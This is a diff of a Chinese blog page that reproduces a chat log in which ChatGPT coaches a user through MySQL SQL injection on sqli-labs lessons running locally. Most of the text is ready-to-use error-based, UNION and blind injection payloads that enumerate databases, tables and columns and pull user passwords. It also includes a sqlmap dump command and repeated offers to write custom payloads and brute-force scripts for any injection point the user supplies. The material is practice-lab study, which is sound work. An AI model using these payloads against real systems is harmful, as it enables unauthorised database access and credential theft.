+<p><code>?id=1&#39; and extractvalue(1, concat(0x7e, (SELECT schema_name FROM information_schema.schemata LIMIT 0,1), 0x7e)) --+</code></p>
+<h3 id="🧪-爆表："><a href="#🧪-爆表：" class="headerlink" title="🧪 爆表："></a>🧪 爆表：</h3><p>sql</p>
+<p>复制编辑</p>
+<p><code>?id=1&#39; and extractvalue(1, concat(0x7e, (SELECT table_name FROM information_schema.tables WHERE table_schema=&#39;sqli-labs&#39; LIMIT 0,1), 0x7e)) --+</code></p>
+<hr>
+<h2 id="✅-6-联合注入（页面有回显时）"><a href="#✅-6-联合注入（页面有回显时）" class="headerlink" title="✅ 6. 联合注入（页面有回显时）"></a>✅ 6. 联合注入（页面有回显时）</h2><p>页面正常输出 SQL 结果时，可以直接用 <code>UNION SELECT</code> 拼出结果：</p>
+<p>sql</p>
+<p>复制编辑</p>
+<p><code>?id=1&#39; UNION SELECT 1, schema_name, 3 FROM information_schema.schemata --+</code></p>
+<p>如果你能控制显示字段位置，效果最好。</p>
+<hr>
+<h2 id="✅-7-爆字段值（如用户名密码）"><a href="#✅-7-爆字段值（如用户名密码）" class="headerlink" title="✅ 7. 爆字段值（如用户名密码）"></a>✅ 7. 爆字段值（如用户名密码）</h2><p>确定字段名后，可以爆用户密码：</p>
+<p>sql</p>
+<p>复制编辑</p>
+<p><code>?id=1&#39; AND substr((SELECT password FROM users LIMIT 0,1),1,1)=&#39;a&#39; --+</code></p>
+<p>或报错注入版本：</p>
+<p>sql</p>
+<p>复制编辑</p>
+<p><code>?id=1&#39; AND extractvalue(1, concat(0x7e,(SELECT password FROM users LIMIT 0,1),0x7e)) --+</code></p>
+<hr>
+<h2 id="🧩-常用函数表"><a href="#🧩-常用函数表" class="headerlink" title="🧩 常用函数表"></a>🧩 常用函数表</h2><table>
+<thead>
+<tr>
+<th>函数</th>
+<th>用途</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>database()</code></td>
+<td>当前数据库名</td>
+</tr>
+<tr>
+<td><code>user()</code></td>
+<td>当前登录用户</td>
+</tr>
+<tr>
+<td><code>version()</code></td>
+<td>数据库版本</td>
+</tr>
+<tr>
+<td><code>schema_name</code>, <code>table_name</code>, <code>column_name</code></td>
+<td>元数据字段</td>
+</tr>
+<tr>
+<td><code>LIMIT offset,1</code></td>
+<td>遍历列表</td>
+</tr>
+<tr>
+<td><code>substr(str,pos,1)</code></td>
+<td>提取单个字符（用于盲注）</td>
+</tr>
+<tr>
+<td><code>extractvalue()</code> &#x2F; <code>updatexml()</code></td>
+<td>报错注入用</td>
+</tr>
+</tbody></table>
+<hr>
+<p>如你提供你当前注入点示例或页面反馈特征，我可以给你写一套定制 payload 和爆破脚本（支持 sqlmap&#x2F;手工两种）。需要吗？</p>
+<h5 id="您说："><a href="#您说：" class="headerlink" title="您说："></a>您说：</h5><p>报错注入有长度限制</p>
+<h6 id="ChatGPT-说：-1"><a href="#ChatGPT-说：-1" class="headerlink" title="ChatGPT 说："></a>ChatGPT 说：</h6><p>是的，<strong>报错注入确实存在长度限制问题</strong>，特别是在使用 <code>extractvalue()</code>、<code>updatexml()</code> 等函数时——当拼接的字符串太长，可能会：</p>
+<ul>
+<li><p>被数据库函数自身截断；</p>
+</li>
+<li><p>被 WAF 拦截或编码异常；</p>
+</li>
+<li><p>被页面返回长度限制截断（HTML响应体上限）；</p>
+</li>
+<li><p>导致函数本身执行失败（比如 <code>extractvalue()</code> 解析失败或报错信息过大）；</p>
+</li>
+</ul>
+<hr>
+<h2 id="✅-一、常见报错注入函数的限制分析"><a href="#✅-一、常见报错注入函数的限制分析" class="headerlink" title="✅ 一、常见报错注入函数的限制分析"></a>✅ 一、常见报错注入函数的限制分析</h2><h3 id="1-extractvalue-xml-xpath"><a href="#1-extractvalue-xml-xpath" class="headerlink" title="1. extractvalue(xml, xpath)"></a>1. <code>extractvalue(xml, xpath)</code></h3><ul>
+<li><p>一般最多回显 <strong>~32-64字节（字符）</strong> 的内容，超长会导致：</p>
+<ul>
+<li><p><code>XPATH syntax error: &#39;xxxxx……&#39;</code> 被截断；</p>
+</li>
+<li><p>或直接报错中断。</p>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="2-updatexml-xml-xpath-value"><a href="#2-updatexml-xml-xpath-value" class="headerlink" title="2. updatexml(xml, xpath, value)"></a>2. <code>updatexml(xml, xpath, value)</code></h3><ul>
+<li><p>同样限制回显长度；</p>
+</li>
+<li><p>还可能在拼接多条信息时出现：</p>
+<p>nginx</p>
+<p>复制编辑</p>
+<p><code>XPATH syntax error: &#39;xxx......&#39;</code></p>
+<p>报错中无法显示完整结果。</p>
+</li>
+</ul>
+<h3 id="3-floor-rand-报错方式（适用于-MySQL-5-x）"><a href="#3-floor-rand-报错方式（适用于-MySQL-5-x）" class="headerlink" title="3. floor() + rand() 报错方式（适用于 MySQL 5.x）"></a>3. <code>floor()</code> + <code>rand()</code> 报错方式（适用于 MySQL 5.x）</h3><ul>
+<li>虽然可以用来判断内容，但输出信息不包含数据本体，不适用于“直接输出数据”。</li>
+</ul>
+<hr>
+<h2 id="✅-二、如何判断是否发生了长度截断？"><a href="#✅-二、如何判断是否发生了长度截断？" class="headerlink" title="✅ 二、如何判断是否发生了长度截断？"></a>✅ 二、如何判断是否发生了长度截断？</h2><p>你可以尝试以下两个方式：</p>
+<h3 id="✅-方法-1：不断增长长度确认"><a href="#✅-方法-1：不断增长长度确认" class="headerlink" title="✅ 方法 1：不断增长长度确认"></a>✅ 方法 1：不断增长长度确认</h3><p>sql</p>
+<p>复制编辑</p>
+<p><code>?id=1&#39; AND extractvalue(1, concat(0x7e, REPEAT(&#39;A&#39;, 30), 0x7e)) --+</code></p>
+<p>逐步将 30 → 50 → 80 → 100，直到不再完整回显（或直接报错）即为最大回显长度。</p>
+<hr>
+<h3 id="✅-方法-2：报错内容前后缺失"><a href="#✅-方法-2：报错内容前后缺失" class="headerlink" title="✅ 方法 2：报错内容前后缺失"></a>✅ 方法 2：报错内容前后缺失</h3><p>sql</p>
+<p>复制编辑</p>
+<p><code>?id=1&#39; AND extractvalue(1, concat(0x7e, (SELECT group_concat(schema_name) FROM information_schema.schemata), 0x7e)) --+</code></p>
+<p>输出为：</p>
+<p>vbnet</p>
+<p>复制编辑</p>
+<p><code>XPATH syntax error: &#39;~information_schema,testdb,sqli_lab...</code></p>
+<p>说明内容<strong>被截断</strong>。</p>
+<hr>
+<h2 id="✅-三、解决办法（建议使用以下技巧）"><a href="#✅-三、解决办法（建议使用以下技巧）" class="headerlink" title="✅ 三、解决办法（建议使用以下技巧）"></a>✅ 三、解决办法（建议使用以下技巧）</h2><table>
+<thead>
+<tr>
+<th>方式</th>
+<th>描述</th>
+<th>示例</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>✅ 分段输出</td>
+<td>一次只输出一个数据库名或字段</td>
+<td><code>LIMIT 0,1</code>, <code>LIMIT 1,1</code></td>
+</tr>
+<tr>
+<td>✅ 子字符串截取</td>
+<td>用 <code>substr()</code> 每次截取几位</td>
+<td><code>substr((),1,20)</code></td>
+</tr>
+<tr>
+<td>✅ 多次请求拼接</td>
+<td>每次爆破一部分，手工&#x2F;自动拼接</td>
+<td>脚本 or sqlmap 逐字符输出</td>
+</tr>
+<tr>
+<td>✅ 用盲注替代</td>
+<td>如果报错输出不全，换用布尔&#x2F;时间盲注</td>
+<td><code>substr(...)=xx</code> 或 <code>sleep()</code></td>
+</tr>
+<tr>
+<td>✅ 控制回显字符</td>
+<td>用 <code>0x7e</code> 包裹数据，避免意外中断</td>
+<td><code>concat(0x7e, data, 0x7e)</code></td>
+</tr>
+<tr>
+<td>✅ 不用 <code>group_concat()</code></td>
+<td>容易超长，建议 <code>LIMIT + substr</code> 代替</td>
+<td><code>SELECT table_name FROM ... LIMIT 0,1</code></td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="✅-四、可选替代策略（自动化工具）"><a href="#✅-四、可选替代策略（自动化工具）" class="headerlink" title="✅ 四、可选替代策略（自动化工具）"></a>✅ 四、可选替代策略（自动化工具）</h2><h3 id="🛠-用-sqlmap-控制数据长度："><a href="#🛠-用-sqlmap-控制数据长度：" class="headerlink" title="🛠 用 sqlmap 控制数据长度："></a>🛠 用 <code>sqlmap</code> 控制数据长度：</h3><p>bash</p>
+<p>复制编辑</p>
+<p><code>sqlmap -u &quot;http://target.com?id=1&quot; --technique=E --string=&quot;XPATH&quot; --dump</code></p>
+<p>可加上：</p>
+<ul>
+<li><p><code>--no-cast</code>（避免 cast 导致的报错溢出）</p>
+</li>
+<li><p><code>--chunk</code> 或手动 <code>--start</code> 和 <code>--stop</code> 分段读取</p>
+</li>
+</ul>
+<hr>
+<h2 id="✅-五、实战建议"><a href="#✅-五、实战建议" class="headerlink" title="✅ 五、实战建议"></a>✅ 五、实战建议</h2><p>如果你在靶场中看到：</p>
+<ul>
+<li><p>报错信息始终显示不完整</p>
+</li>
+<li><p>回显内容长度异常一致</p>
+</li>
+<li><p>页面总是返回 <code>XPATH syntax error: &#39;xxxxx&#39;</code></p>
+</li>
+</ul>
+<p>👉 说明：你 hit 到了长度限制。</p>
+<p><strong>最佳方案：切换到布尔盲注或时间盲注</strong>，虽慢但稳。</p>
+<hr>
+<p>如你提供 payload 或目标页面，我可以帮你分析是不是长度截断并给出拆分 payload。需要吗？</p>
+<h5 id="您说：-1"><a href="#您说：-1" class="headerlink" title="您说："></a>您说：</h5><p><a target="_blank" rel="noopener" href="http://127.0.0.1:8082/Less-1?id=-1">http://127.0.0.1:8082/Less-1?id=-1</a>‘ UNION SELECT 1,group_concat(column_name),3 from information_schema.columns –+ 没指定where column_name&#x3D;’users’. ame:CHARACTER_SET_NAME,DEFAULT_COLLATE_NAME,DESCRIPTION,MAXLEN,COLLATION_NAME,CHARACTER_SET_NAME,ID,IS_DEFAULT,IS_COMPILED,SORTLEN,COLLATION_NAME,CHARACTER_SET_NAME,TABLE_CATALOG,TABLE_SCHEMA,TABLE_NAME,COLUMN_NAME,ORDINAL_POSITION,COLUMN_DEFAULT,IS_NULLABLE,DATA_TYPE,CHARACTER_MAXIMUM_LENGTH,CHARACTER_OCTET_LENGTH,NUMERIC_PRECISION,NUMERIC_SC 不全，怎么遍历</p>
+<h6 id="ChatGPT-说：-2"><a href="#ChatGPT-说：-2" class="headerlink" title="ChatGPT 说："></a>ChatGPT 说：</h6><p>你遇到的问题非常典型：在报错&#x2F;联合注入中使用 <code>group_concat(column_name)</code> 列出所有字段名，但由于未限定 <code>WHERE</code> 条件导致结果 <strong>过长被截断</strong>，页面输出不全，核心字段信息如 <code>COLUMN_NAME</code> 显示被截断了。</p>
+<hr>
+<h2 id="✅-问题总结"><a href="#✅-问题总结" class="headerlink" title="✅ 问题总结"></a>✅ 问题总结</h2><p>你的 payload 是这样的：</p>
+<p>sql</p>
+<p>复制编辑</p>
+<p><code>?id=-1&#39; UNION SELECT 1, group_concat(column_name), 3 FROM information_schema.columns --+</code></p>
+<h3 id="🔥-问题点："><a href="#🔥-问题点：" class="headerlink" title="🔥 问题点："></a>🔥 问题点：</h3><ul>
+<li><p>没有 <code>WHERE table_schema=&#39;xxx&#39; AND table_name=&#39;xxx&#39;</code>，所以把<strong>所有表的字段</strong>都抓了出来；</p>
+</li>
+<li><p><code>group_concat()</code> 默认最大输出长度为 1024 字节（可配置），容易被截断；</p>
+</li>
+<li><p>输出字段数量太多 → 页面回显不完整。</p>
+</li>
+</ul>
+<hr>
+<h2 id="✅-正确做法：限定库名-表名-分批读取"><a href="#✅-正确做法：限定库名-表名-分批读取" class="headerlink" title="✅ 正确做法：限定库名+表名 + 分批读取"></a>✅ 正确做法：<strong>限定库名+表名</strong> + 分批读取</h2><hr>
+<h3 id="✅-一、爆出某表字段名（推荐写法）："><a href="#✅-一、爆出某表字段名（推荐写法）：" class="headerlink" title="✅ 一、爆出某表字段名（推荐写法）："></a>✅ 一、爆出某表字段名（推荐写法）：</h3><p>sql</p>
+<p>复制编辑</p>
+<p><code>?id=-1&#39; UNION SELECT 1, group_concat(column_name), 3  FROM information_schema.columns  WHERE table_schema=&#39;security&#39; AND table_name=&#39;users&#39; --+</code></p>
+<p>✅ 说明：</p>
+<ul>
+<li><p><code>security</code> 是数据库名</p>
+</li>
+<li><p><code>users</code> 是表名</p>
+</li>
+<li><p>只输出该表的字段名，不会超长！</p>
+</li>
+</ul>
+<hr>
+<h3 id="✅-二、逐行爆字段名（LIMIT-分页方式）"><a href="#✅-二、逐行爆字段名（LIMIT-分页方式）" class="headerlink" title="✅ 二、逐行爆字段名（LIMIT 分页方式）"></a>✅ 二、逐行爆字段名（LIMIT 分页方式）</h3><p>如果你不知道字段太多会被截断，就用 <code>LIMIT</code> 分批取，例如：</p>
+<p>sql</p>
+<p>复制编辑</p>
+<p><code>?id=-1&#39; UNION SELECT 1, column_name, 3  FROM information_schema.columns  WHERE table_schema=&#39;security&#39; AND table_name=&#39;users&#39;  LIMIT 0,1 --+</code></p>
+<p>依次改为：</p>
+<ul>
+<li><p><code>LIMIT 1,1</code></p>
+</li>
+<li><p><code>LIMIT 2,1</code></p>
+</li>
+<li><p>…</p>
+</li>
+</ul>
+<p>直到取不到结果为止，就爆完了所有字段名。</p>
+<hr>
+<h2 id="✅-三、如果仍然超长，改为-substr-控制单个字段名长度"><a href="#✅-三、如果仍然超长，改为-substr-控制单个字段名长度" class="headerlink" title="✅ 三、如果仍然超长，改为 substr() 控制单个字段名长度"></a>✅ 三、如果仍然超长，改为 <code>substr()</code> 控制单个字段名长度</h2><p>sql</p>
+<p>复制编辑</p>
+<p><code>?id=-1&#39; UNION SELECT 1, substr(column_name,1,20), 3  FROM information_schema.columns  WHERE table_schema=&#39;security&#39; AND table_name=&#39;users&#39;  LIMIT 0,1 --+</code></p>
+<hr>
+<h2 id="✅-四、实用辅助信息：如何知道当前库名？"><a href="#✅-四、实用辅助信息：如何知道当前库名？" class="headerlink" title="✅ 四、实用辅助信息：如何知道当前库名？"></a>✅ 四、实用辅助信息：如何知道当前库名？</h2><p>爆当前数据库名：</p>
+<p>sql</p>
+<p>复制编辑</p>
+<p><code>?id=-1&#39; UNION SELECT 1, database(), 3 --+</code></p>
+<p>爆当前数据库下所有表：</p>
+<p>sql</p>
+<p>复制编辑</p>
+<p><code>?id=-1&#39; UNION SELECT 1, group_concat(table_name), 3  FROM information_schema.tables  WHERE table_schema=database() --+</code></p>
+<p>爆某表字段名（已知表名）：</p>
+<p>sql</p>
+<p>复制编辑</p>
+<p><code>?id=-1&#39; UNION SELECT 1, group_concat(column_name), 3  FROM information_schema.columns  WHERE table_schema=database() AND table_name=&#39;users&#39; --+</code></p>
+<hr>
+<h2 id="✅-五、小结"><a href="#✅-五、小结" class="headerlink" title="✅ 五、小结"></a>✅ 五、小结</h2><table>
+<thead>
+<tr>
+<th>目标</th>
+<th>推荐写法</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>当前数据库名</td>
+<td><code>SELECT database()</code></td>
+</tr>
+<tr>
+<td>当前库的所有表</td>
+<td><code>FROM information_schema.tables WHERE table_schema=database()</code></td>
+</tr>
+<tr>
+<td>某表字段名</td>
+<td><code>FROM information_schema.columns WHERE table_name=&#39;xxx&#39; AND table_schema=&#39;xxx&#39;</code></td>
+</tr>
+<tr>
+<td>避免超长</td>
+<td>用 <code>LIMIT</code> + <code>substr()</code> 分页读取</td>
+</tr>
+</tbody></table>
+<hr>
+<p>如果你告诉我你现在是哪个库名和表名，我可以直接帮你生成字段爆破 payload 脚本（可选自动化）。要不要继续？</p>
+<h5 id="您说：-2"><a href="#您说：-2" class="headerlink" title="您说："></a>您说：</h5><p><a target="_blank" rel="noopener" href="http://127.0.0.1:8082/Less-5?id=-1">http://127.0.0.1:8082/Less-5?id=-1</a>‘ and extractvalue(1,concat(0x7e,select group_concat(schema_name) from information_schema.schemata),0x7e)) –+ 错误</p>
+<h6 id="ChatGPT-说：-3"><a href="#ChatGPT-说：-3" class="headerlink" title="ChatGPT 说："></a>ChatGPT 说：</h6><p>你写的这个报错注入 payload 基本思路是对的，但存在几个语法&#x2F;逻辑问题，下面我来 <strong>指出错误 + 修改正确版本</strong>，并解释原因。</p>
+<hr>
+<h2 id="❌-原始错误-Payload"><a href="#❌-原始错误-Payload" class="headerlink" title="❌ 原始错误 Payload"></a>❌ 原始错误 Payload</h2><p>sql</p>
+<p>复制编辑</p>
+<p><code>?id=-1&#39; and extractvalue(1,concat(0x7e,select group_concat(schema_name) from information_schema.schemata),0x7e)) --+</code></p>
+<h3 id="❌-存在的问题："><a href="#❌-存在的问题：" class="headerlink" title="❌ 存在的问题："></a>❌ 存在的问题：</h3><ol>
+<li><p><code>concat()</code> 的参数写错了，<code>select</code> 语句要整体作为一个参数嵌进去；</p>
+</li>
+<li><p>多了一个 <code>)</code>；</p>
+</li>
+<li><p><code>extractvalue()</code> 是 <code>extractvalue(xml, xpath_expr)</code>，你写成了三个参数；</p>
+</li>
+<li><p>MySQL 不允许 <code>concat()</code> 中放置 <code>SELECT</code> 和常量混合不规范的表达式；</p>
+</li>
+</ol>
+<hr>
+<h2 id="✅-正确语法格式（爆数据库名）"><a href="#✅-正确语法格式（爆数据库名）" class="headerlink" title="✅ 正确语法格式（爆数据库名）"></a>✅ 正确语法格式（爆数据库名）</h2><p>sql</p>
+<p>复制编辑</p>
+<p><code>?id=-1&#39; and extractvalue(1, concat(0x7e, (select group_concat(schema_name) from information_schema.schemata), 0x7e)) --+</code></p>
+<hr>
+<h2 id="✅-如果回显不全怎么办？"><a href="#✅-如果回显不全怎么办？" class="headerlink" title="✅ 如果回显不全怎么办？"></a>✅ 如果回显不全怎么办？</h2><p>用 <code>LIMIT</code> 逐条输出：</p>
+<p>sql</p>
+<p>复制编辑</p>
+<p><code>?id=-1&#39; and extractvalue(1, concat(0x7e, (select schema_name from information_schema.schemata limit 0,1), 0x7e)) --+</code></p>
+<p>然后改成：</p>
+<ul>
+<li><p><code>limit 1,1</code></p>
+</li>
+<li><p><code>limit 2,1</code></p>
+</li>
+<li><p>…</p>
+</li>
+</ul>
+<p>直到取不到内容为止，表示列举完毕。</p>
+<hr>
+<h2 id="✅-字符过长报错提示？"><a href="#✅-字符过长报错提示？" class="headerlink" title="✅ 字符过长报错提示？"></a>✅ 字符过长报错提示？</h2><p>你可能会遇到这个：</p>
+<p>nginx</p>
+<p>复制编辑</p>
+<p><code>XPATH syntax error: &#39;......&#39;</code></p>
+<p>说明内容太长，可以改成爆一条、或者配合 <code>substr()</code> 控制长度：</p>
+<p>sql</p>
+<p>复制编辑</p>
+<p><code>?id=-1&#39; and extractvalue(1, concat(0x7e, substr((select schema_name from information_schema.schemata limit 0,1),1,30), 0x7e)) --+</code></p>
+<hr>
+<h2 id="✅-快速测试当前是否成功爆出："><a href="#✅-快速测试当前是否成功爆出：" class="headerlink" title="✅ 快速测试当前是否成功爆出："></a>✅ 快速测试当前是否成功爆出：</h2><p>sql</p>
+<p>复制编辑</p>
+<p><code>?id=-1&#39; and extractvalue(1, concat(0x7e, database(), 0x7e)) --+</code></p>
+<p>页面应返回：</p>
+<p>nginx</p>
+<p>复制编辑</p>
+<p><code>XPATH syntax error: &#39;~security~&#39;</code></p>
+<hr>
+<h2 id="✅-其他推荐-payload（报错注入常用）"><a href="#✅-其他推荐-payload（报错注入常用）" class="headerlink" title="✅ 其他推荐 payload（报错注入常用）"></a>✅ 其他推荐 payload（报错注入常用）</h2><h3 id="爆当前表名（已知库名）："><a href="#爆当前表名（已知库名）：" class="headerlink" title="爆当前表名（已知库名）："></a>爆当前表名（已知库名）：</h3><p>sql</p>
+<p>复制编辑</p>
+<p><code>?id=-1&#39; and extractvalue(1, concat(0x7e, (select group_concat(table_name) from information_schema.tables where table_schema=database()), 0x7e)) --+</code></p>
+<h3 id="爆字段名（已知表）："><a href="#爆字段名（已知表）：" class="headerlink" title="爆字段名（已知表）："></a>爆字段名（已知表）：</h3><p>sql</p>
+<p>复制编辑</p>
+<p><code>?id=-1&#39; and extractvalue(1, concat(0x7e, (select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39; and table_schema=database()), 0x7e)) --+</code></p>
+<hr>
+<p>如你希望我自动生成 payload 脚本进行循环爆库&#x2F;爆表&#x2F;爆字段，我可以写 Python&#x2F;SQLmap 脚本给你。是否需要？</p>
+<h5 id="您说：-3"><a href="#您说：-3" class="headerlink" title="您说："></a>您说：</h5><p><a target="_blank" rel="noopener" href="http://127.0.0.1:8082/Less-5?id=-1">http://127.0.0.1:8082/Less-5?id=-1</a>‘ and extractvalue(1,concat(0x7e,(select group_concat(schema_name) from information_schema.schemata limit 0,1),0x7e)) –+ XPATH syntax error: ‘~information_schema,challenges,m’. limit 1,1),0x7e)) –+ 修改后无回显</p>
+<h6 id="ChatGPT-说：-4"><a href="#ChatGPT-说：-4" class="headerlink" title="ChatGPT 说："></a>ChatGPT 说：</h6><p>你现在的情况说明得非常清楚：</p>
+<hr>
+<h2 id="❗-问题现象"><a href="#❗-问题现象" class="headerlink" title="❗ 问题现象"></a>❗ 问题现象</h2><ul>
+<li><p>第一次请求（<code>limit 0,1</code>）：</p>
+<p>sql</p>
+<p>复制编辑</p>
+<p><code>...extractvalue(1, concat(0x7e, (select group_concat(schema_name) from information_schema.schemata limit 0,1), 0x7e))...</code></p>
+<p>✅ 有回显（<code>information_schema,challenges,m</code>）</p>
+</li>
+<li><p>修改为 <code>limit 1,1</code> 后：</p>
+<p>sql</p>
+<p>复制编辑</p>
+<p><code>...limit 1,1...</code></p>
+<p>❌ 无回显（或者页面无报错）</p>
+</li>
+</ul>
+<hr>
+<h2 id="✅-原因分析"><a href="#✅-原因分析" class="headerlink" title="✅ 原因分析"></a>✅ 原因分析</h2><p>你用了 <code>group_concat(...) limit 1,1</code>，但注意：</p>
+<h3 id="⚠️-group-concat-是聚合函数，不能直接用-LIMIT-控制它的行！"><a href="#⚠️-group-concat-是聚合函数，不能直接用-LIMIT-控制它的行！" class="headerlink" title="⚠️ group_concat(...) 是聚合函数，不能直接用 LIMIT 控制它的行！"></a>⚠️ <code>group_concat(...)</code> 是<strong>聚合函数</strong>，不能直接用 <code>LIMIT</code> 控制它的行！</h3><hr>
+<h2 id="✅-正确写法对比："><a href="#✅-正确写法对比：" class="headerlink" title="✅ 正确写法对比："></a>✅ 正确写法对比：</h2><table>
+<thead>
+<tr>
+<th>错误写法 ❌</th>
+<th>正确写法 ✅</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>select group_concat(schema_name) limit 1,1</code></td>
+<td><code>select schema_name from ... limit 1,1</code></td>
+</tr>
+<tr>
+<td>多条合并后限制长度 → 报错或无输出</td>
+<td>每条单独读取</td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="✅-正确-payload-写法（逐条枚举-schema-名）"><a href="#✅-正确-payload-写法（逐条枚举-schema-名）" class="headerlink" title="✅ 正确 payload 写法（逐条枚举 schema 名）"></a>✅ 正确 payload 写法（逐条枚举 schema 名）</h2><p>sql</p>
+<p>复制编辑</p>
+<p><code>?id=-1&#39; and extractvalue(1, concat(0x7e, (select schema_name from information_schema.schemata limit 0,1), 0x7e)) --+</code></p>
+<p>然后改为：</p>
+<p>sql</p>
+<p>复制编辑</p>
+<p><code>limit 1,1 limit 2,1 limit 3,1 ...</code></p>
+<p>每次只爆一个库名，绝对不会被截断。</p>
+<hr>
+<h2 id="✅-示例完整一条："><a href="#✅-示例完整一条：" class="headerlink" title="✅ 示例完整一条："></a>✅ 示例完整一条：</h2><p>http</p>
+<p>复制编辑</p>
+<p><code>http://127.0.0.1:8082/Less-5?id=-1&#39; and extractvalue(1, concat(0x7e, (select schema_name from information_schema.schemata limit 1,1), 0x7e)) --+</code></p>
+<p>如返回：</p>
+<p>nginx</p>
+<p>复制编辑</p>
+<p><code>XPATH syntax error: &#39;~challenges~&#39;</code></p>
+<p>则说明枚举成功，继续改 <code>limit</code> 下标即可。</p>
+<hr>
+<h2 id="✅-可选技巧：爆所有库名时控制长度"><a href="#✅-可选技巧：爆所有库名时控制长度" class="headerlink" title="✅ 可选技巧：爆所有库名时控制长度"></a>✅ 可选技巧：爆所有库名时控制长度</h2><p>如果一定要 <code>group_concat()</code> 爆多个库名，可以配合 <code>substr()</code> 限制长度（适用于仅想看前几个）：</p>
+<p>sql</p>
+<p>复制编辑</p>
+<p><code>?id=-1&#39; and extractvalue(1, concat(0x7e, substr((select group_concat(schema_name) from information_schema.schemata), 1, 50), 0x7e)) --+</code></p>
+<hr>
+<h2 id="✅-小总结"><a href="#✅-小总结" class="headerlink" title="✅ 小总结"></a>✅ 小总结</h2><table>
+<thead>
+<tr>
+<th>场景</th>
+<th>方法</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>🔢 多个数据库名（防截断）</td>
+<td><code>select schema_name ... limit n,1</code></td>
+</tr>
+<tr>
+<td>🧠 不要 <code>group_concat(...) limit ...</code></td>
+<td>语法错误 or 无输出</td>
+</tr>
+<tr>
+<td>📦 控制长度</td>
+<td><code>substr(..., 1, N)</code></td>
+</tr>
+<tr>
+<td>🚫 页面无回显</td>
+<td>很可能是语法失误 or 被拦截，可切换盲注</td>
+</tr>
+</tbody></table>
+<hr>
+<p>如你现在想爆表、爆字段，我可以直接帮你生成对应 payload，你只需告诉我当前数据库名或我帮你爆出也行。是否继续？</p>
+
   </div>
 </article>
 
@@ -174,6 +678,10 @@
 
     
     
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#floor%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">1.</span> <span class="toc-text">floor报错注入</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#ChatGPT-%E8%AF%B4%EF%BC%9A"><span class="toc-number">1.0.0.1.</span> <span class="toc-text">ChatGPT 说：</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-1-%E6%95%B0%E6%8D%AE%E5%BA%93%E7%BB%93%E6%9E%84%E5%9F%BA%E7%A1%80%EF%BC%88MySQL%EF%BC%89"><span class="toc-number"></span> <span class="toc-text">✅ 1. 数据库结构基础（MySQL）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-2-%E7%88%86%E5%BA%93%EF%BC%88%E5%88%97%E5%87%BA%E6%89%80%E6%9C%89%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D%EF%BC%89"><span class="toc-number"></span> <span class="toc-text">✅ 2. 爆库（列出所有数据库名）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%A7%A0-%E6%9E%84%E9%80%A0-payload-%E7%A4%BA%E4%BE%8B%EF%BC%88%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%EF%BC%89%EF%BC%9A"><span class="toc-number">1.</span> <span class="toc-text">🧠 构造 payload 示例（布尔盲注）：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-3-%E7%88%86%E8%A1%A8%EF%BC%88%E5%88%97%E5%87%BA%E6%8C%87%E5%AE%9A%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%8B%E7%9A%84%E6%89%80%E6%9C%89%E8%A1%A8%E5%90%8D%EF%BC%89"><span class="toc-number"></span> <span class="toc-text">✅ 3. 爆表（列出指定数据库下的所有表名）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-4-%E7%88%86%E5%AD%97%E6%AE%B5%EF%BC%88%E5%88%97%E5%87%BA%E6%9F%90%E8%A1%A8%E7%9A%84%E6%89%80%E6%9C%89%E5%AD%97%E6%AE%B5%E5%90%8D%EF%BC%89"><span class="toc-number"></span> <span class="toc-text">✅ 4. 爆字段（列出某表的所有字段名）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-5-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E6%96%B9%E5%BC%8F%EF%BC%88%E6%9B%B4%E5%BF%AB%EF%BC%89"><span class="toc-number"></span> <span class="toc-text">✅ 5. 报错注入方式（更快）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%A7%AA-%E7%88%86%E5%BA%93%EF%BC%9A"><span class="toc-number">1.</span> <span class="toc-text">🧪 爆库：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%A7%AA-%E7%88%86%E8%A1%A8%EF%BC%9A"><span class="toc-number">2.</span> <span class="toc-text">🧪 爆表：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-6-%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%EF%BC%88%E9%A1%B5%E9%9D%A2%E6%9C%89%E5%9B%9E%E6%98%BE%E6%97%B6%EF%BC%89"><span class="toc-number"></span> <span class="toc-text">✅ 6. 联合注入（页面有回显时）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-7-%E7%88%86%E5%AD%97%E6%AE%B5%E5%80%BC%EF%BC%88%E5%A6%82%E7%94%A8%E6%88%B7%E5%90%8D%E5%AF%86%E7%A0%81%EF%BC%89"><span class="toc-number"></span> <span class="toc-text">✅ 7. 爆字段值（如用户名密码）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%A7%A9-%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0%E8%A1%A8"><span class="toc-number"></span> <span class="toc-text">🧩 常用函数表</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%82%A8%E8%AF%B4%EF%BC%9A"><span class="toc-number">0.0.1.</span> <span 